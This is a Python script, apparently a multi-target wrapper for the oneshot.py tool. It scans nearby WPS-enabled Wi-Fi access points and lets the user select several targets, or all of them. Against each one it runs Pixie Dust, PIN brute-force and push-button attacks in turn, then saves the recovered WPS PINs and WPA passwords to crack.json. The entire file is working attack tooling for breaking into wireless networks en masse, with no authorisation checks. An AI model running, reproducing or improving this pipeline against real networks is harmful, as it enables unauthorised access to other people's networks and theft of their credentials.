#!/usr/bin/env python3
from __future__ import annotations

import argparse
import json
import os
import pty
import re
import select
import shutil
import signal
import subprocess
import sys
import time
from pathlib import Path

CRACK_FILE = "crack.json"

REQUIRED_BINARIES = {
    "wpa_supplicant": "wpa_supplicant",
    "pixiewps": "pixiewps",
    "iw": "iw",
    "ip": "iproute2",
}

BANNER = r"""
   ██████╗ ███╗   ██╗███████╗███████╗██╗  ██╗ ██████╗ ████████╗
  ██╔═══██╗████╗  ██║██╔════╝██╔════╝██║  ██║██╔═══██╗╚══██╔══╝
  ██║   ██║██╔██╗ ██║█████╗  ███████╗███████║██║   ██║   ██║   
  ██║   ██║██║╚██╗██║██╔══╝  ╚════██║██╔══██║██║   ██║   ██║   
  ╚██████╔╝██║ ╚████║███████╗███████║██║  ██║╚██████╔╝   ██║   
   ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   
  ══════════════════════════════════════════════════════════════
   Multi-Target WPS Pipeline Wrapper  |  Author: Clinhfist
   GitHub: https://github.com/Clinhfist/Oneshot
  ══════════════════════════════════════════════════════════════
"""

ANSI_ESCAPE_RE = re.compile(r"\x1b\[[0-9;]*[mK]")
GREEN_ANSI_RE = re.compile(r"\x1b\[(?:[0-9;]*;)?(?:32|92)m")
MAC_RE = re.compile(r"\b([0-9A-Fa-f]{2}(?::[0-9A-Fa-f]{2}){5})\b")


def print_banner() -> None:
    print(f"\033[96m{BANNER}\033[0m")


def restore_wifi(interface: str | None) -> None:
    if not interface:
        return
    commands = [
        ["ip", "link", "set", interface, "down"],
        ["iw", "dev", interface, "set", "type", "managed"],
        ["ip", "link", "set", interface, "up"],
        ["nmcli", "device", "set", interface, "managed", "yes"],
        ["nmcli", "radio", "wifi", "on"],
    ]
    for cmd in commands:
        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)


def check_dependencies() -> None:
    missing = [
        f"{bin_name} (pkg: {pkg})"
        for bin_name, pkg in REQUIRED_BINARIES.items()
        if shutil.which(bin_name) is None
    ]
    if missing:
        print("[-] Missing required system tools:")
        for item in missing:
            print(f"    - {item}")
        print("[!] Install them via your package manager (e.g. pacman -S / apt install) and retry.")
        sys.exit(1)


def set_nm_managed(interface: str, managed: bool) -> None:
    if shutil.which("nmcli") is None:
        return
    state = "yes" if managed else "no"
    try:
        subprocess.run(
            ["nmcli", "device", "set", interface, "managed", state],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=5,
            check=False,
        )
    except Exception:
        pass


def prepare_interface(interface: str) -> None:
    set_nm_managed(interface, False)
    subprocess.run(
        ["ip", "link", "set", interface, "up"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        timeout=5,
        check=False,
    )


def restore_interface(interface: str) -> None:
    subprocess.run(
        ["ip", "link", "set", interface, "up"],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        timeout=5,
        check=False,
    )
    set_nm_managed(interface, True)


def _kill_proc_group(proc: subprocess.Popen) -> None:
    if proc.poll() is not None:
        return
    try:
        pgid = os.getpgid(proc.pid)
        os.killpg(pgid, signal.SIGTERM)
        proc.wait(timeout=3)
    except ProcessLookupError:
        pass
    except subprocess.TimeoutExpired:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
            proc.wait(timeout=2)
        except Exception:
            pass
    except Exception:
        try:
            proc.terminate()
            proc.wait(timeout=2)
        except Exception:
            pass


def _build_env_unbuffered() -> dict[str, str]:
    env = os.environ.copy()
    env["PYTHONUNBUFFERED"] = "1"
    return env


def _normalize_python_cmd(cmd: list[str]) -> list[str]:
    normalized = list(cmd)
    if (
        len(normalized) >= 2
        and Path(normalized[0]).name.startswith("python")
        and "-u" not in normalized[1:2]
    ):
        normalized.insert(1, "-u")
    return normalized


def get_oneshot_scan_output(interface: str, wait_sec: float = 8.0) -> str:
    master_fd, slave_fd = pty.openpty()
    proc = subprocess.Popen(
        ["python3", "-u", "oneshot.py", "-i", interface],
        stdin=slave_fd,
        stdout=slave_fd,
        stderr=slave_fd,
        close_fds=True,
        env=_build_env_unbuffered(),
    )
    os.close(slave_fd)

    chunks: list[str] = []
    start = time.monotonic()
    try:
        while (time.monotonic() - start) < wait_sec:
            r, _, _ = select.select([master_fd], [], [], 0.2)
            if master_fd in r:
                try:
                    data = os.read(master_fd, 4096)
                except OSError:
                    break
                if not data:
                    break
                text = data.decode("utf-8", errors="replace")
                chunks.append(text)

                clean_so_far = ANSI_ESCAPE_RE.sub("", "".join(chunks))
                if re.search(
                    r"(?:Select|Choose|Enter|Target|номер|ціль)",
                    clean_so_far,
                    re.IGNORECASE,
                ) and re.search(r"^\s*\d+[\)\.]", clean_so_far, re.MULTILINE):
                    break
    finally:
        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=2)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()
        try:
            os.close(master_fd)
        except OSError:
            pass

    return "".join(chunks)


def parse_oneshot_networks(raw_output: str) -> dict[int, dict[str, object]]:
    networks: dict[int, dict[str, object]] = {}
    idx_counter = 1

    for raw_line in raw_output.splitlines():
        is_green = bool(GREEN_ANSI_RE.search(raw_line))
        clean_line = ANSI_ESCAPE_RE.sub("", raw_line).strip()
        if not clean_line:
            continue

        mac_match = MAC_RE.search(clean_line)
        if not mac_match:
            continue

        bssid = mac_match.group(1).upper()
        prefix = clean_line[: mac_match.start()].strip()
        suffix = clean_line[mac_match.end() :].strip()

        num_match = re.match(r"^(\d+)\s*[\)\.]?\s*$", prefix)
        num = int(num_match.group(1)) if num_match else idx_counter
        idx_counter += 1

        rssi = "N/A"
        essid = "HIDDEN"

        rssi_match = re.search(r"(-\d{2,3})\s*(?:dBm)?", suffix)
        if rssi_match:
            rssi = rssi_match.group(1)
            before_rssi = suffix[: rssi_match.start()].strip()
            after_rssi = suffix[rssi_match.end() :].strip()
            candidate_essid = before_rssi or after_rssi
        else:
            candidate_essid = suffix

        if candidate_essid:
            parts = re.split(r"\s{2,}|\t+", candidate_essid)
            essid = parts[0].strip() if parts[0].strip() else "HIDDEN"

        networks[num] = {
            "BSSID": bssid,
            "ESSID": essid,
            "Level": rssi,
            "Green": is_green,
        }

    ordered = sorted(networks.items(), key=lambda kv: (not bool(kv[1]["Green"]), kv[0]))
    return {(i + 1): net for i, (_, net) in enumerate(ordered)}


def scan_networks(interface: str) -> dict[int, dict[str, object]]:
    print(f"[*] Scanning WPS networks via oneshot.py on {interface}...")
    raw_output = get_oneshot_scan_output(interface)
    parsed = parse_oneshot_networks(raw_output)
    if not parsed and raw_output.strip():
        print("[!] Could not parse rows automatically. Raw oneshot output:")
        print(ANSI_ESCAPE_RE.sub("", raw_output))
    return parsed


def load_cracks(filepath: str = CRACK_FILE) -> list[dict[str, str]]:
    if not os.path.exists(filepath):
        return []
    try:
        with open(filepath, "r", encoding="utf-8") as f:
            data = json.load(f)
            return data if isinstance(data, list) else []
    except Exception:
        return []


def append_crack(record: dict[str, str], filepath: str = CRACK_FILE) -> None:
    records = load_cracks(filepath)
    records.append(record)
    with open(filepath, "w", encoding="utf-8") as f:
        json.dump(records, f, ensure_ascii=False, indent=2)


def print_cracks(filepath: str = CRACK_FILE) -> None:
    records = load_cracks(filepath)
    if not records:
        print(f"[-] No records found in {filepath}.")
        return

    for idx, item in enumerate(records, 1):
        if idx > 1:
            print("-" * 30)
        print(f"Назва точки: {item.get('essid', '')}")
        print(f"Bssid: {item.get('bssid', '')}")
        print(f"pin: {item.get('pin', '')}")
        print(f"Pass: {item.get('pass', '')}")
        print(f"Метод виявлення: {item.get('method', '')}")


def parse_oneshot_output(
    output: str, fallback_essid: str, bssid: str, method: str
) -> dict[str, str] | None:
    pin_match = re.search(r"WPS PIN:\s*['\"]?([0-9]+)['\"]?", output, re.IGNORECASE)
    psk_match = re.search(
        r"(?:WPA PSK|PSK|Password):\s*['\"]?([^\r\n]+)['\"]?", output, re.IGNORECASE
    )
    essid_match = re.search(r"ESSID:\s*['\"]?([^\r\n'()]+)['\"]?", output)

    if not pin_match and not psk_match:
        return None

    essid = essid_match.group(1).strip() if essid_match else fallback_essid
    pin = pin_match.group(1).strip() if pin_match else ""
    psk = psk_match.group(1).strip().strip("'\"") if psk_match else ""

    return {
        "essid": essid,
        "bssid": bssid.upper(),
        "pin": pin,
        "pass": psk,
        "method": method,
    }


def _clear_live_line(live_line_shown: bool) -> bool:
    if live_line_shown:
        sys.stdout.write("\r" + (" " * 110) + "\r")
        sys.stdout.flush()
    return False


def run_stage(
    cmd: list[str],
    fallback_essid: str,
    bssid: str,
    method: str,
    timeout_sec: int = 900,
    max_idle_sec: int = 90,
    max_same_pin_retries: int = 8,
    max_fail_streak: int = 12,
    heartbeat_sec: float = 2.0,
) -> dict[str, str] | None:
    captured: list[str] = []
    normalized_cmd = _normalize_python_cmd(cmd)

    proc = subprocess.Popen(
        normalized_cmd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        bufsize=0,
        start_new_session=True,
        env=_build_env_unbuffered(),
    )

    raw_stdout = proc.stdout
    fd = raw_stdout.fileno() if raw_stdout is not None else None
    line_buf = bytearray()

    start_time = time.monotonic()
    last_line_time = start_time
    last_heartbeat = start_time
    last_pin: str | None = None
    last_status = "initializing..."
    same_pin_count = 0
    fail_streak = 0
    line_count = 0
    live_line_shown = False
    spinner = ("|", "/", "-", "\\")
    spin_idx = 0

    def process_line(line: str) -> bool:
        nonlocal line_count, last_line_time, last_pin, last_status, same_pin_count, fail_streak, live_line_shown
        live_line_shown = _clear_live_line(live_line_shown)
        line_count += 1
        last_line_time = time.monotonic()
        sys.stdout.write(line)
        sys.stdout.flush()
        captured.append(line)

        clean_line = ANSI_ESCAPE_RE.sub("", line).strip()
        if clean_line:
            last_status = clean_line[:75]

        pin_try = re.search(r"Trying PIN\s+['\"]([0-9]+)['\"]", clean_line)
        if pin_try:
            pin_val = pin_try.group(1)
            if pin_val == last_pin:
                same_pin_count += 1
                if same_pin_count >= max_same_pin_retries:
                    print(f"\n[!] PIN '{pin_val}' repeated {same_pin_count} times. Skipping stuck stage...")
                    _kill_proc_group(proc)
                    return False
            else:
                last_pin = pin_val
                same_pin_count = 1

        if re.search(r"WPS\s+Locked|AP\s+rate\s+limiting", clean_line, re.IGNORECASE):
            print("\n[!] Target reported WPS Locked. Skipping stage...")
            _kill_proc_group(proc)
            return False

        if re.search(r"WPS-FAIL|WPS transaction failed|Received WSC NACK", clean_line, re.IGNORECASE):
            fail_streak += 1
            if fail_streak >= max_fail_streak:
                print(f"\n[!] Too many consecutive WPS failures ({fail_streak}). Skipping stuck stage...")
                _kill_proc_group(proc)
                return False
        elif re.search(r"Received WPS Message M[1-8]|WPS PIN:|WPA PSK:", clean_line):
            fail_streak = 0

        return True

    try:
        while True:
            ready, _, _ = select.select([fd], [], [], 0.25) if fd is not None else ([], [], [])
            now = time.monotonic()

            if fd is not None and fd in ready:
                try:
                    chunk = os.read(fd, 4096)
                except OSError:
                    chunk = b""

                if chunk:
                    line_buf.extend(chunk)
                    while b"\n" in line_buf:
                        nl_idx = line_buf.index(b"\n")
                        raw_line = bytes(line_buf[:nl_idx + 1])
                        del line_buf[:nl_idx + 1]
                        decoded = raw_line.decode("utf-8", errors="replace")
                        if not process_line(decoded):
                            break
                elif proc.poll() is not None:
                    break

            if proc.poll() is not None:
                if line_buf:
                    decoded = bytes(line_buf).decode("utf-8", errors="replace")
                    line_buf.clear()
                    process_line(decoded)
                break

            now = time.monotonic()
            if (now - last_heartbeat) >= heartbeat_sec:
                elapsed = int(now - start_time)
                idle = int(now - last_line_time)
                frame = spinner[spin_idx % len(spinner)]
                spin_idx += 1
                status_msg = (
                    f"\r{frame} [{method}] active | elapsed: {elapsed}s | "
                    f"idle: {idle}s | lines: {line_count} | last: {last_status}"
                )
                sys.stdout.write(status_msg[:109].ljust(109))
                sys.stdout.flush()
                live_line_shown = True
                last_heartbeat = now

            if (now - last_line_time) > max_idle_sec:
                live_line_shown = _clear_live_line(live_line_shown)
                print(f"[!] Stage idle timeout ({max_idle_sec}s) reached for {bssid}. Skipping stage...")
                _kill_proc_group(proc)
                break

            if (now - start_time) > timeout_sec:
                live_line_shown = _clear_live_line(live_line_shown)
                print(f"[!] Stage timeout ({timeout_sec}s) reached for {bssid}. Skipping stage...")
                _kill_proc_group(proc)
                break

        proc.wait(timeout=3)
    except KeyboardInterrupt:
        live_line_shown = _clear_live_line(live_line_shown)
        _kill_proc_group(proc)
        raise
    finally:
        live_line_shown = _clear_live_line(live_line_shown)
        if raw_stdout is not None:
            raw_stdout.close()

    full_output = "".join(captured)
    return parse_oneshot_output(full_output, fallback_essid, bssid, method)



def main() -> None:
    print_banner()

    parser = argparse.ArgumentParser(
        description="Multi-target pipeline wrapper for oneshot.py"
    )
    parser.add_argument(
        "-c",
        "--cracks",
        action="store_true",
        help="Print formatted results from crack.json",
    )
    parser.add_argument("-i", "--interface", type=str, help="Wireless interface")
    parser.add_argument(
        "-d",
        "--delay",
        type=float,
        default=2.0,
        help="Delay between pin attempts for bruteforce",
    )
    parser.add_argument(
        "-F", "--pixie-force", action="store_true", help="Use --pixie-force flag"
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="Pass -v to oneshot.py for verbose output",
    )
    parser.add_argument(
        "-r",
        "--restore",
        action="store_true",
        help="Restore Wi-Fi interface to managed mode and re-enable networking",
    )
    parser.add_argument(
        "--pbc",
        action="store_true",
        help="Include Push Button Connect stage if needed",
    )
    args = parser.parse_args()

    if args.restore:
        restore_wifi(args.interface)
        print(f"[*] Restored {args.interface or 'interface'} to normal Wi-Fi mode.")
        return

    if args.cracks:
        print_cracks(CRACK_FILE)
        sys.exit(0)

    if not args.interface:
        parser.error(
            "the following arguments are required: -i/--interface (unless -c is used)"
        )

    if os.geteuid() != 0:
        print("[-] Error: Run script as root (sudo)")
        sys.exit(1)

    check_dependencies()
    prepare_interface(args.interface)

    try:
        net_dict = scan_networks(args.interface)
        if not net_dict:
            print("[-] No WPS-enabled networks found.")
            sys.exit(0)

        print("\nAvailable WPS Networks (from oneshot):")
        for n, net in net_dict.items():
            badge = "\033[92m[GREEN / VULN]\033[0m" if net["Green"] else "[normal]"
            pwr_str = f"{net['Level']}dBm" if net["Level"] != "N/A" else "N/A"
            print(
                f"{n}) {badge} BSSID: {net['BSSID']} | ESSID: {net['ESSID']} | PWR: {pwr_str}"
            )

        choice = input(
            "\nSelect targets (e.g. 1-3, 1 2 4, or 0 for all): "
        ).strip()
        selected_targets: list[dict[str, object]] = []

        try:
            if choice == "0":
                selected_targets = list(net_dict.values())
            elif "-" in choice:
                start, end = map(int, choice.split("-", 1))
                for i in range(start, end + 1):
                    if i in net_dict:
                        selected_targets.append(net_dict[i])
            else:
                for p in map(int, choice.split()):
                    if p in net_dict:
                        selected_targets.append(net_dict[p])
        except ValueError:
            print("[-] Invalid input format for selection.")
            sys.exit(1)

        if not selected_targets:
            print("[-] No valid targets selected.")
            sys.exit(0)

        print(
            f"\n[+] Selected {len(selected_targets)} targets. Starting automated pipeline..."
        )

        for idx, target in enumerate(selected_targets, 1):
            bssid = str(target["BSSID"])
            essid = str(target["ESSID"])

            print("\n" + "=" * 60)
            print(f"[{idx}/{len(selected_targets)}] Processing Target: {essid} ({bssid})")
            print("=" * 60)

            stages: list[tuple[str, list[str]]] = []

            pixie_cmd = [
                "python3",
                "-u",
                "oneshot.py",
                "-i",
                args.interface,
                "-b",
                bssid,
                "-K",
            ]
            pixie_label = "Pixie Dust (-K)"
            if args.pixie_force:
                pixie_cmd.append("-F")
                pixie_label += " + Pixie Force (-F)"
            stages.append((pixie_label, pixie_cmd))

            brute_cmd = [
                "python3",
                "-u",
                "oneshot.py",
                "-i",
                args.interface,
                "-b",
                bssid,
                "-B",
                "-d",
                str(args.delay),
            ]
            stages.append(("Bruteforce (-B)", brute_cmd))

            if args.pbc:
                pbc_cmd = [
                    "python3",
                    "-u",
                    "oneshot.py",
                    "-i",
                    args.interface,
                    "-b",
                    bssid,
                    "--pbc",
                ]
                stages.append(("PBC (--pbc)", pbc_cmd))

            if args.verbose:
                for _, stage_cmd in stages:
                    if "-v" not in stage_cmd:
                        stage_cmd.append("-v")

            found = False
            try:
                for stage_name, stage_cmd in stages:
                    print(f"\n[*] Stage: {stage_name}...")
                    result = run_stage(stage_cmd, essid, bssid, stage_name)
                    if result:
                        append_crack(result, CRACK_FILE)
                        print(
                            f"\n[+] Found and saved to {CRACK_FILE} via {stage_name}. Moving to next target..."
                        )
                        found = True
                        break
            except KeyboardInterrupt:
                print("\n[-] Interrupted by user.")
                if input("Exit completely? (y/N): ").strip().lower() == "y":
                    sys.exit(0)
                continue

            if not found:
                print(f"\n[-] Nothing found for {bssid} across all stages.")

        print("\n[+] Multi-target pipeline session completed successfully!")
    finally:
        restore_interface(args.interface)
        restore_wifi(args.interface)


if __name__ == "__main__":
    main()
